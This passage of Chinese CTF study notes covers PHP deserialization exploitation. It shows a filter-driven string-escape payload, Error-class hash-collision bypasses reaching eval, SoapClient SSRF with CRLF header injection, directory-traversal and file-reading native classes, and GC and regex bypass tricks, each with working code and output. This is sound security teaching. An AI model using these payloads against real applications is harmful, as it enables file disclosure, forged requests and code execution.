class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可控变量</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">还有一个<span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>]是需要我们覆盖的变量</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>序列化→过滤→反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>目标子串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(d0g3_f1ag.php)=<span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span></span><br><span class="line"><span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>观察序列化字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//过滤后字符减少3或者4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//不可控变量，固定值base64_encode(&#x27;guest_img.png&#x27;)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;过滤前:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;</span><br><span class="line">过滤前:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">过滤后:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:4:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">需要计算过滤处到目标子串的长度：&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot; 长度为23，不为3或4的倍数，最接近的是24，所以在</span></span><br><span class="line"><span class="string">目标子串头添加任意一个字符变成a&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">所以过滤后会吃掉<span class="number">24</span>个字符，所以可以选择<span class="number">4</span>*<span class="number">6</span>或者<span class="number">3</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//过滤后字符减少</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;<span class="comment">//过滤后向后吃24个字符，或者php*8</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;khaz&quot;;s:4:&quot;haha&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//不可控变量，固定值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;过滤前:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">过滤前:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">过滤后:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">E:\xampp2\php\www\2.php:19:</span></span><br><span class="line"><span class="string">array(3) &#123;</span></span><br><span class="line"><span class="string">  &#x27;user&#x27; =&gt;</span></span><br><span class="line"><span class="string">  string(24) &quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="string">&#x27;img&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span></span><br><span class="line">  <span class="string">&#x27;khaz&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;添加了这个是因为<span class="variable">$_SESSION</span>有三个值(a:<span class="number">3</span>),数量要对的上才能反序列化</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h1><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br></pre></td></tr></table></figure><h2 id="获取指定方法的原生类"><a href="#获取指定方法的原生类" class="headerlink" title="获取指定方法的原生类"></a>获取指定方法的原生类</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>(); <span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>); <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>( <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__toString&#x27;</span>, <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__callStatic&#x27;</span>, <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__unset&#x27;</span>, <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</p><p>比如说题目给的代码有MD5，eval等，这些函数的参数都是字符串类型，所以可以触发<code>__tostring</code>魔术方法</p></blockquote><h2 id="Error-x2F-Exception-类"><a href="#Error-x2F-Exception-类" class="headerlink" title="Error&#x2F;Exception 类"></a>Error&#x2F;Exception 类</h2><blockquote><p>用于自定义错误类型的</p></blockquote><table><thead><tr><th align="center">类</th><th align="center">适用版本</th><th align="center">属性（一样的）</th></tr></thead><tbody><tr><td align="center">Error</td><td align="center">php7</td><td align="center">message：异常消息内容                                                           file：抛出异常的文件名</td></tr><tr><td align="center">Exception</td><td align="center">php5&#x2F;php7</td><td align="center">line：抛出异常在该文件中的行号                                         code：异常代码</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">3</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure><p>仔细观察会发现只有异常代码code没有被输出，并且只有行号line不同</p><p>利用</p><blockquote><p>可用来绕过类属性的哈希比较</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;相同&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不相同&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807151831343.png" alt="image-20220807151831343"></p><blockquote><p>值不相同（对象，异常代码不同）,md5和sha1的值相同（输出的是一样的）</p></blockquote><h3 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br></pre></td></tr></table></figure><p>多了一个eval</p><p>只需要将payload构造为<code>?&gt;&lt;? payload?&gt;</code>的形式即可,前面的<code>?&gt;</code>把文件原来的<code>&lt;?php</code>闭合了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>( <span class="meta">?&gt;</span>    <span class="meta">&lt;?php</span> payload <span class="meta">?&gt;</span>        )    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClient类"><a href="#SoapClient类" class="headerlink" title="SoapClient类"></a>SoapClient类</h2><blockquote><p>内置call方法，当call方法被调用时，就会发起http请求，可以伪造ssrf请求</p><p>并因为可以自定义user_agent请求头从而造成crlf漏洞。</p></blockquote><p>可能会出现的问题<a href="https://stackoverflow.com/questions/11391442/fatal-error-class-soapclient-not-found">Fatal error: Uncaught Error: Class ‘SoapClient’ not found in</a></p><blockquote><p>CRLF注入是一类注入漏洞。是“回车+换行”的简称，又叫做回车换行符。<br>表示为<code>\r\n</code>，编码之后是<code>%0d%0a</code>。这个在HTTP协议中表示消息头与消息体之间的分隔。</p><p>浏览器就是根据这两个CRLF来分离HTTPHeader与HTTPBody的。从而把HTTP内容显示出来。所以，如果我们能够控制HTTP消息头的字符，那么我们就能够注入一些恶意的换行。</p></blockquote><p>例子SoapClient::call方法发送soap请求,伪造post数据</p><p>在linux下执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://192.168.244.128:8888/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">notexists</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221027114101336.png" alt="image-20221027114101336" style="zoom:67%;" /><p>因为我们设置了Content-length，那么读取了data&#x3D;abc后就会舍弃掉后面的数据</p><h2 id="文件操作类"><a href="#文件操作类" class="headerlink" title="文件操作类"></a>文件操作类</h2><p>注：FilesystemIterator 是DirectoryIterator的子类，所以可以将DirectoryIterator换为FilesystemIterator。</p><h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/image-20221128122840348.png" alt="image-20221128122840348" style="zoom:80%;" /><h4 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h4><ul><li><p>查找根目录的flag文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123553510.png" alt="image-20221128123553510"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221128123054538.png" alt="image-20221128123054538"></p><blockquote><p>​<strong>GlobIterator 类支持直接通过模式匹配来寻找文件路径</strong></p></blockquote><ul><li><p>确认文件路径</p><p>假设现在知道flag的文件名为flag，但不知道具体路径</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 目录穿越</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://../../../flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123216008.png" alt="image-20221128123216008"></p><p>当输出flag时，说明路径是正确的。</p></li></ul><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/flag&#x27;</span>)));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$f1ag</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128122206828.png" alt="image-20221128122206828"></p><h1 id="一些绕过trick"><a href="#一些绕过trick" class="headerlink" title="一些绕过trick"></a>一些绕过trick</h1><p><a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4">php(phar)反序列化漏洞及各种绕过姿势</a></p><h3 id="GC机制绕过抛出异常"><a href="#GC机制绕过抛出异常" class="headerlink" title="GC机制绕过抛出异常"></a>GC机制绕过抛出异常</h3><blockquote><p>正常情况下抛出异常并且没有捕捉的话php是不会执行析构函数的</p><p>但在laravel这种框架里通常都有全局的错误处理与异常捕捉，显示通用的500或者错误页面。 只要异常被捕捉，后面的析构就会执行了。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> test, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;i:1;N&#x27;</span>, <span class="string">&#x27;i:0;N&#x27;</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>因为<strong>反序列化的过程是顺序执行</strong>的，所以到第一个属性时，会将<code>Array[0]</code>设置为对象，同时我们又将<code>Array[0]</code>设置为<code>null</code>，这样前面的<code>test</code>对象便丢失了引用，就会被GC所捕获，就可以执行<code>__destruct</code>了</p></blockquote><h3 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>用+O代替O</p></li><li><p>用数组绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></li></ul><h3 id="绕过字符过滤"><a 